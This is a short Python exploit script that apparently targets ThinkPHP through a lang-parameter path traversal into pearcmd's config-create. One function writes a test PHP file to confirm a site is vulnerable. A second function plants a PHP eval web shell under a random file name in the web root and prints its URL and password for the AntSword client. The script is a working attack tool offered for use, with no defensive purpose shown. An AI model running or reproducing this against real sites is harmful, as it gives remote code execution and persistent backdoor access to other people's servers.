import requests
import random
import string
import urllib.request as request

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
    "Cookie":"think_lang=zh-cn"
}

# class TrickUrlSession(requests.Session):
#     def setUrl(self, url):
#         self._trickUrl = url
#     def send(self, request, **kwargs):
#         if self._trickUrl:
#             request.url = self._trickUrl
#         return requests.Session.send(self, request, **kwargs)


def exp_check(url=str):
    try:
        url = url.split(":")
        url = url[0]+":"+url[1]+":"+url[2]
        payload = "/public/index.php?+config-create+/&lang=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=var_dump('check')?>+/var/www/html/check.php"
        rsp = requests.get(url+payload,headers=headers,verify=False)
        if "Successfully created default configuration file" in rsp.text:
            com = requests.get(url+"check.php",headers=headers,verify=False,timeout=5)
            if "check" in com.text:
                return 1
            else:
                return 2
    
    except Exception  as e :
        return 3

def exp_others(url):
    try:
        url = url.split(":")
        url = url[0]+":"+url[1]+":"+url[2]
        random_str = ''.join(random.sample(string.ascii_letters + string.digits, 4))
        payload = "/public/index.php?+config-create+/&lang=../../../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_REQUEST['pass']);?>+/var/www/html/{}.php".format(random_str)
        request.urlopen(url+payload)
        rsp = requests.get(url+"/{}.php".format(random_str),headers=headers,verify=False)
        if rsp.status_code == 200:
            return "利用成功  路径为:\t "+url+"{}.php     密码为：pass   (蚁剑链接)     ".format(random_str)
    except Exception  as e :
        return 3
